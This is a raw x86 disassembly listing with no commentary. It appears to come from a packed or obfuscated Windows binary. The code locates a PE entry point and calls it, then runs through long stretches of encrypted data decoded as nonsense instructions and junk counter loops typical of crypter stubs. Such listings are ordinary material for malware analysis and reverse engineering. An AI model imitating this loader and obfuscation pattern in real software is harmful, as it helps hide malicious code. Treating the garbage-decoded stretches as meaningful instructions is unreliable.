  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x626491c7],ecx
  4069de:	dec    edx
  4069df:	fisttp QWORD PTR [ebp+0x66]
  4069e2:	(bad)  
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	push   esp
  4069ea:	mov    esp,0x1d1d0396
  4069ef:	(bad)  
  4069f0:	fucomi st,st(6)
  4069f2:	bound  ecx,QWORD PTR [ecx]
  4069f4:	cmp    BYTE PTR [esi+0x4e],bl
  4069f7:	add    ch,bh
  4069f9:	cmc    
  4069fa:	ins    DWORD PTR es:[edi],dx
  4069fb:	xchg   BYTE PTR [esp+esi*8],dh
  4069fe:	jo     0x4069ff
  406a00:	adc    edx,esp
  406a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a03:	popf   
  406a04:	xchg   esp,eax
  406a05:	or     BYTE PTR [esi+0x58aa16cd],al
  406a0b:	test   ch,cl
  406a0d:	inc    ecx
  406a0e:	mov    esi,0xe354b0de
  406a13:	xchg   edx,eax
  406a14:	dec    eax
  406a15:	out    0x8c,eax
  406a17:	cmc    
  406a18:	(bad)  
  406a19:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1b:	(bad)  
  406a1c:	std    
  406a1d:	xor    ecx,DWORD PTR [eax]
  406a1f:	jp     0x4069ed
  406a21:	mov    edx,0x8c1b2c76
  406a26:	fmul   QWORD PTR [ecx+0x7c3af8b5]
  406a2c:	inc    edx
  406a2d:	mov    bh,0x5c
  406a2f:	lods   al,BYTE PTR ds:[esi]
  406a30:	dec    esi
  406a31:	mov    ds:0x1034d177,al
  406a36:	test   al,0x1c
  406a38:	pop    ebp
  406a39:	xchg   edi,eax
  406a3a:	mov    bh,0x5d
  406a3c:	add    BYTE PTR [ecx],dl
  406a3e:	adc    eax,0xcd257835
  406a43:	addr16 mov dl,bl
  406a46:	add    BYTE PTR [edx-0x3f30ab05],dl
  406a4c:	xchg   ebx,eax
  406a4d:	fs pop eax
  406a4f:	inc    esp
  406a50:	inc    edi
  406a51:	inc    ecx
  406a52:	pusha  
  406a53:	fadd   st,st(7)
  406a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a56:	shl    BYTE PTR [eax+0x709fb644],cl
  406a5c:	test   DWORD PTR [edx-0x24],edx
  406a5f:	iret   
  406a60:	xchg   dh,dl
  406a62:	pop    ds
  406a63:	inc    esi
  406a64:	popa   
  406a65:	or     al,bh
  406a67:	and    BYTE PTR [ecx],0x47
  406a6a:	sar    BYTE PTR [ecx],1
  406a6c:	push   es
  406a6d:	loope  0x406a3b
  406a6f:	push   esi
  406a70:	sbb    eax,0x6d740b3a
  406a75:	cmp    eax,0xa245e38c
  406a7a:	mov    bl,BYTE PTR [edx+0x3f42e6e6]
  406a80:	pop    eax
  406a81:	or     DWORD PTR [edi-0x574559a9],eax
  406a87:	dec    esp
  406a88:	pop    edi
  406a89:	jl     0x406a52
  406a8b:	mov    ch,0x79
  406a8d:	and    cl,BYTE PTR ds:0x256ad4da
  406a93:	fbstp  TBYTE PTR [ebp+ecx*1-0x7b]
  406a97:	lods   eax,DWORD PTR ds:[esi]
  406a98:	pop    edx
  406a99:	add    DWORD PTR [eax+0x78],0x36
  406a9d:	cdq    
  406a9e:	or     BYTE PTR [ecx],cl
  406aa0:	add    bh,bh
  406aa2:	scas   al,BYTE PTR es:[edi]
  406aa3:	test   BYTE PTR [ebp+ebp*1-0x33],bl
  406aa7:	mov    WORD PTR [ebp+0x3b74da45],ds
  406aad:	push   eax
  406aae:	(bad)  
  406aaf:	call   eax
  406ab1:	lods   eax,DWORD PTR ds:[esi]
  406ab2:	add    ebp,DWORD PTR [edi]
  406ab4:	ret    0xd7c4
  406ab7:	and    al,0xca
  406ab9:	stos   BYTE PTR es:[edi],al
  406aba:	and    dh,cl
  406abc:	cmp    dh,BYTE PTR [edi-0x75]
  406abf:	dec    esi
  406ac0:	lods   eax,DWORD PTR ds:[esi]
  406ac1:	and    al,0xf
  406ac3:	dec    DWORD PTR [ebx]
  406ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac6:	aaa    
  406ac7:	addr16 inc ebp
  406ac9:	daa    
  406aca:	mov    esp,0x7e3bbc5f
  406acf:	js     0x406b3b
  406ad1:	retf   
  406ad2:	jge    0x406a5b
  406ad4:	jnp    0x406ac5
  406ad6:	cmp    BYTE PTR [esi-0x5b],bl
  406ad9:	test   al,0x22
  406adb:	push   edx
  406adc:	idiv   DWORD PTR [esi]
  406ade:	jle    0x406aa2
  406ae0:	lahf   
  406ae1:	pushf  
  406ae2:	loop   0x406b59
  406ae4:	jne    0x406b27
  406ae6:	add    DWORD PTR [eax-0x2634db68],esi
  406aec:	mov    ebx,0x49e73305
  406af1:	xchg   esi,eax
  406af2:	or     BYTE PTR [edx-0x53],bh
  406af5:	push   esi
  406af6:	lods   al,BYTE PTR ds:[esi]
  406af7:	out    dx,al
  406af8:	stos   DWORD PTR es:[edi],eax
  406af9:	sbb    BYTE PTR [eax-0x41],ch
  406afc:	push   esi
  406afd:	pushf  
  406afe:	add    DWORD PTR [ecx-0x58],esi
  406b01:	dec    ebp
  406b02:	out    dx,al
  406b03:	adc    edi,esi
  406b05:	sbb    al,0x3b
  406b07:	mov    DWORD PTR [ebp-0x1b7601d],eax
  406b0d:	dec    ecx
  406b0e:	mov    al,0xed
  406b10:	xchg   ebp,eax
  406b11:	mov    edi,0xcb5a44d3
  406b16:	es inc ebx
  406b18:	cmp    al,0xae
  406b1a:	mov    ds,WORD PTR [ebp+ebp*8-0x42]
  406b1e:	adc    al,0x33
  406b20:	mov    BYTE PTR [eax],0x91
  406b23:	sbb    eax,0xe88d8a12
  406b28:	push   esi
  406b29:	sub    DWORD PTR [ebx-0x42],0xffffffe1
  406b2d:	into   
  406b2e:	and    cl,al
  406b30:	push   edi
  406b31:	out    0xd5,eax
  406b33:	mov    edi,0xa7e69c1c
  406b38:	xor    al,0x20
  406b3a:	push   cs
  406b3b:	and    eax,DWORD PTR [esi+ebx*1-0x5b]
  406b3f:	jno    0x406b7c
  406b41:	add    cl,BYTE PTR [edx+0x3a0f12b1]
  406b47:	inc    ebx
  406b48:	fnstsw WORD PTR [eax]
  406b4a:	push   ss
  406b4b:	mov    ch,0x81
  406b4d:	adc    al,0x65
  406b4f:	cwde   
  406b50:	pop    esi
  406b51:	and    bl,BYTE PTR [ebx-0x371fc7f0]
  406b57:	shl    dh,0xa6
  406b5a:	and    al,0x66
  406b5c:	(bad)  
  406b5d:	pusha  
  406b5e:	and    eax,0xe69670d4
  406b63:	cmp    eax,0x7b85f7ae
  406b68:	jbe    0x406be1
  406b6a:	or     DWORD PTR [edx+0x61e120e8],0xffffffb0
  406b71:	dec    esp
  406b72:	nop
  406b73:	xchg   edx,eax
  406b74:	sbb    eax,0xac711778
  406b79:	ds add eax,0x785a7980
  406b7f:	dec    ebp
  406b80:	xor    DWORD PTR [ebx+ebx*8],eax
  406b83:	fbld   TBYTE PTR [edi]
  406b85:	cmp    ah,BYTE PTR [edi+0x33]
  406b88:	test   al,al
  406b8a:	sub    ebx,DWORD PTR [ebx-0x21a25d59]
  406b90:	mov    ebp,0x34b3fc7b
  406b95:	jge    0x406c14
  406b97:	lock or al,BYTE PTR ds:0xaa04b7c4
  406b9e:	and    BYTE PTR [esp+eax*2-0x657eb34c],0x4b
  406ba6:	push   cs
  406ba7:	out    0x6a,al
  406ba9:	push   ebx
  406baa:	and    DWORD PTR [ebp+edi*1-0x78],0x641d7777
  406bb2:	sub    BYTE PTR [ecx+0x46],ah
  406bb5:	iret   
  406bb6:	push   ebx
  406bb7:	cmc    
  406bb8:	es addr16 jo 0x406b4c
  406bbc:	mov    dh,0x8c
  406bbe:	pop    ds
  406bbf:	lods   al,BYTE PTR ds:[esi]
  406bc0:	scas   al,BYTE PTR es:[edi]
  406bc1:	addr16 jnp 0x406bc2
  406bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc5:	test   eax,0x6d23952e
  406bca:	sub    BYTE PTR [edx+0x53],ch
  406bcd:	retf   
  406bce:	outs   dx,BYTE PTR ds:[esi]
  406bcf:	addr16 sub eax,0xd27d5a24
  406bd5:	mov    ?,WORD PTR [ebp+ecx*8-0x2d]
  406bd9:	punpckhbw mm5,mm2
  406bdc:	cmp    edi,DWORD PTR [esi+0x3b]
  406bdf:	xor    DWORD PTR [eax],ebp
  406be1:	mov    eax,0xbf4271f4
  406be6:	shr    esi,1
  406be8:	(bad)  
  406be9:	pusha  
  406bea:	sbb    al,0x80
  406bec:	lods   eax,DWORD PTR ds:[esi]
  406bed:	cdq    
  406bee:	sahf   
  406bef:	cmp    eax,0xedc771c9
  406bf4:	mov    ah,dl
  406bf6:	pop    esp
  406bf7:	loope  0x406c50
  406bf9:	cli    
  406bfa:	cs xchg esi,eax
  406bfc:	adc    DWORD PTR [edx-0x5f],edx
  406bff:	pop    ebp
  406c00:	imul   esi,ebp,0x17
  406c03:	int3   
  406c04:	bound  edi,QWORD PTR [esi]
  406c06:	imul   ebx,DWORD PTR [edi+0x3677965],0xfffffff1
  406c0d:	fisub  DWORD PTR [eax]
  406c0f:	bound  ebx,QWORD PTR [edi-0x1a1457fd]
  406c15:	xchg   BYTE PTR [ebp+edi*1+0xdd2dcb7],dl
  406c1c:	lds    esp,FWORD PTR [eax+0x4437437c]
  406c22:	cwde   
  406c23:	sbb    edx,DWORD PTR [eax]
  406c25:	sar    DWORD PTR [edi],1
  406c27:	and    ebp,ebp
  406c29:	ret    0x2e81
  406c2c:	outs   dx,DWORD PTR ds:[esi]
  406c2d:	sar    cl,1
  406c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c30:	pop    ecx
  406c31:	mov    edi,0x95c0c22c
  406c36:	out    dx,al
  406c37:	mov    esp,0x721dfc11
  406c3c:	jno    0x406bcb
  406c3e:	mov    ah,0xa
  406c40:	jae    0x406c8c
  406c42:	fcmovb st,st(7)
  406c44:	outs   dx,DWORD PTR ds:[esi]
  406c45:	add    bl,ah
  406c47:	push   edx
  406c48:	fstp   QWORD PTR [edi]
  406c4a:	je     0x406eec
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xe0782bde
  406c81:	aad    0x4d
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	and    esi,esp
  406c8d:	inc    esi
  406c8e:	fstp   DWORD PTR [ebp+0xdcd6cea]
  406c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c95:	pop    ebx
  406c96:	js     0x406cf4
  406c98:	inc    esp
  406c99:	es scas eax,DWORD PTR es:[edi]
  406c9b:	push   esi
  406c9c:	cdq    
  406c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c9e:	mov    ecx,0xfbc6215c
  406ca3:	and    eax,0xcb9228cf
  406ca8:	mov    ch,0xe9
  406caa:	cli    
  406cab:	inc    ebp
  406cac:	out    0x18,eax
  406cae:	cs sbb eax,0xb80a4bf5
  406cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb5:	and    eax,0x6e1f9986
  406cba:	adc    eax,0x73ecf5c6
  406cbf:	in     al,dx
  406cc0:	pushf  
  406cc1:	add    eax,0x7689a5d8
  406cc6:	adc    ebx,DWORD PTR [bp+di+0x3a]
  406cca:	std    
  406ccb:	test   cl,ch
  406ccd:	mov    bh,0x8a
  406ccf:	push   ecx
  406cd0:	mov    al,0x47
  406cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd3:	mov    edx,0x5d8ec247
  406cd8:	or     DWORD PTR [ebx-0x6bc73f3c],esi
  406cde:	in     eax,0xe7
  406ce0:	test   eax,0x1f0c228
  406ce5:	jecxz  0x406c7a
  406ce7:	test   dh,0xc1
  406cea:	mov    ds:0x47514339,al
  406cef:	push   edi
  406cf0:	add    edi,edi
  406cf2:	rcl    esp,cl
  406cf4:	(bad)  
  406cf5:	or     BYTE PTR [ebx+0x7dd1e345],ah
  406cfb:	jmp    0x86f84d8f
  406d00:	mov    edx,esi
  406d02:	mov    DWORD PTR [edx-0x4ea296ce],ebp
  406d08:	mov    esi,0xdab6436e
  406d0d:	inc    esi
  406d0e:	mov    eax,0x9fd44c3e
  406d13:	jb     0x406d08
  406d15:	out    0x9c,al
  406d17:	sar    ecx,0x7a
  406d1a:	(bad)  
  406d1b:	stc    
  406d1c:	inc    ecx
  406d1d:	test   BYTE PTR [ebp-0x5b],cl
  406d20:	or     BYTE PTR [edi+0x157e1918],cl
  406d26:	icebp  
  406d27:	daa    
  406d28:	sub    eax,0x50d7ff3f
  406d2d:	mov    DWORD PTR [ebp+0x31],ecx
  406d30:	es xchg ecx,edx
  406d33:	sub    dh,BYTE PTR [esi-0x39388507]
  406d39:	pushf  
  406d3a:	mov    ebx,0x27656edf
  406d3f:	push   0x32
  406d41:	scas   al,BYTE PTR es:[edi]
  406d42:	loopne 0x406ce4
  406d44:	sar    BYTE PTR [edx+esi*4],cl
  406d47:	cmp    esi,DWORD PTR [ecx-0x54]
  406d4a:	shl    BYTE PTR [eax+esi*2+0x585dde2],1
  406d51:	shl    al,0x0
  406d54:	sub    edi,edx
  406d56:	call   0x35f53c8e
  406d5b:	inc    edi
  406d5d:	jp     0x406d54
  406d5f:	pop    ebp
  406d60:	xor    eax,0x95acc523
  406d65:	fist   WORD PTR [ecx-0xe5f6c7]
  406d6b:	(bad)  
  406d6c:	dec    esp
  406d6d:	enter  0xe870,0x65
  406d71:	nop
  406d72:	fmul   DWORD PTR [ebp+eiz*8-0x4e]
  406d76:	shl    ch,0xa9
  406d79:	mov    dh,BYTE PTR [ebp+0x7195b1a3]
  406d7f:	mov    edx,0x5d9e8e76
  406d84:	jg     0x406d2e
  406d86:	test   eax,0x16c246d
  406d8b:	push   ss
  406d8c:	stc    
  406d8d:	mov    ch,0x25
  406d8f:	aam    0x9
  406d91:	and    edx,DWORD PTR [ecx-0x43]
  406d94:	je     0x406e10
  406d96:	addr16 cmc 
  406d98:	aaa    
  406d99:	xor    ecx,ecx
  406d9b:	push   esi
  406d9c:	inc    esp
  406d9d:	aam    0x9d
  406d9f:	mov    esi,0x6b108ca3
  406da4:	push   es
  406da5:	xor    edi,DWORD PTR [eax+0x2e463eb7]
  406dab:	xor    DWORD PTR [edx+0x5251103d],esp
  406db1:	pushf  
  406db2:	repnz push esi
  406db4:	int3   
  406db5:	sub    esp,eax
  406db7:	lahf   
  406db8:	mov    ds:0xb03b466f,eax
  406dbd:	bound  esi,QWORD PTR [esi]
  406dbf:	js     0x406d78
  406dc1:	stc    
  406dc2:	xchg   ecx,eax
  406dc3:	leave  
  406dc4:	jp     0x406d51
  406dc6:	loopne 0x406dde
  406dc8:	pop    edi
  406dc9:	in     al,dx
  406dca:	cmp    ecx,DWORD PTR [eax-0x19]
  406dcd:	sbb    BYTE PTR [edi-0x5059994d],al
  406dd3:	xchg   ebx,eax
  406dd4:	sahf   
  406dd5:	test   BYTE PTR [edi+eax*4+0x1e5ff2e7],bh
  406ddc:	or     al,dh
  406dde:	inc    esp
  406ddf:	or     DWORD PTR [esi],ecx
  406de1:	xor    ebx,esi
  406de3:	push   esp
  406de4:	dec    ebx
  406de5:	or     cl,BYTE PTR [edi+0xf]
  406de8:	repz or esp,esp
  406deb:	mov    al,ds:0x87111f5b
  406df0:	lock pop edi
  406df2:	loopne 0x406e08
  406df4:	inc    edi
  406df5:	aam    0x20
  406df7:	jb     0x406d9c
  406df9:	xor    BYTE PTR [esi-0x6f],bl
  406dfc:	retf   0xd00b
  406dff:	pop    ebp
  406e00:	xchg   ecx,eax
  406e01:	jne    0x406dd4
  406e03:	cmp    ch,BYTE PTR [esi]
  406e05:	aaa    
  406e06:	dec    edx
  406e07:	cmp    eax,0xb29f2cfb
  406e0c:	mov    bl,0x3f
  406e0e:	sti    
  406e0f:	sbb    DWORD PTR [eax-0x66002bb7],edx
  406e15:	mov    cl,0xba
  406e17:	pop    es
  406e18:	outs   dx,BYTE PTR ds:[esi]
  406e19:	pusha  
  406e1a:	jns    0x406e61
  406e1c:	inc    ecx
  406e1d:	in     eax,dx
  406e1e:	popf   
  406e1f:	in     eax,dx
  406e20:	sub    eax,0xc33036cb
  406e25:	retf   
  406e26:	adc    dh,BYTE PTR [edx]
  406e28:	inc    eax
  406e29:	lds    edi,FWORD PTR [ebx]
  406e2b:	push   ecx
  406e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e2d:	push   edi
  406e2e:	popf   
  406e2f:	mov    dl,0xb1
  406e31:	add    al,0x7b
  406e33:	cs cmp eax,esp
  406e36:	idiv   DWORD PTR [edi+0x3f278f63]
  406e3c:	popa   
  406e3d:	scas   eax,DWORD PTR es:[edi]
  406e3e:	jne    0x406e8c
  406e40:	or     BYTE PTR [ecx],bl
  406e42:	mov    eax,0x8ae37fde
  406e47:	jmp    0x83fc2902
  406e4c:	test   al,0x93
  406e4e:	xor    eax,0xb7e0e7c5
  406e53:	inc    eax
  406e54:	std    
  406e55:	mov    edx,0x781b5abd
  406e5a:	or     DWORD PTR cs:[ebp-0x2c],esp
  406e5e:	jmp    0x531d50be
  406e63:	jns    0x406e7d
  406e65:	fild   WORD PTR [edx]
  406e67:	mov    ah,0x9f
  406e69:	dec    edi
  406e6a:	xchg   BYTE PTR [ebx],dl
  406e6c:	adc    ecx,eax
  406e6e:	jg     0x406e8f
  406e70:	imul   BYTE PTR ds:0x27d4fd4a
  406e76:	mov    ecx,0x51c44668
  406e7b:	pop    ebp
  406e7c:	sti    
  406e7d:	icebp  
  406e7e:	adc    dl,BYTE PTR [eax+0x5a8971fd]
  406e84:	fld    QWORD PTR [edx]
  406e86:	rcl    BYTE PTR ds:0x7d5d9ba7,1
  406e8c:	add    bl,BYTE PTR [edx]
  406e8e:	push   es
  406e8f:	rcr    dl,cl
  406e91:	leave  
  406e92:	mov    ch,0x68
  406e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e95:	dec    ebx
  406e96:	fdiv   QWORD PTR [edx+0x7e98bde3]
  406e9c:	rcr    DWORD PTR [eax],0xc8
  406e9f:	popf   
  406ea0:	in     eax,0xfd
  406ea2:	cwde   
  406ea3:	(bad)  
  406ea4:	xor    ah,ch
  406ea6:	out    0xcf,al
  406ea8:	out    0xc5,al
  406eaa:	mov    ds:0x39ec249,eax
  406eaf:	sbb    DWORD PTR [edx+esi*4],esp
  406eb2:	pop    esi
  406eb3:	in     al,0x34
  406eb5:	iret   
  406eb6:	push   edx
  406eb7:	jg     0x406f17
  406eb9:	adc    BYTE PTR [eax],cl
  406ebb:	das    
  406ebc:	mov    edx,0xcec07280
  406ec1:	pop    esi
  406ec2:	arpl   WORD PTR [ebp-0x2],bp
  406ec5:	bound  esp,QWORD PTR [esi+ecx*1+0x7709cf36]
  406ecc:	rol    BYTE PTR [ebp+0x47],1
  406ecf:	daa    
  406ed0:	imul   esi,edi,0x1e
  406ed3:	mov    ah,0xaf
  406ed5:	sub    eax,0x65f32beb
  406eda:	fisttp DWORD PTR [edi+0x4a]
  406edd:	add    DWORD PTR [edx+0x2c],0xffffffc6
  406ee1:	repnz add BYTE PTR [ebx],cl
  406ee4:	cmp    esp,DWORD PTR [edi-0x45f3d00e]
  406eea:	mov    ebp,0x10458b9d
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
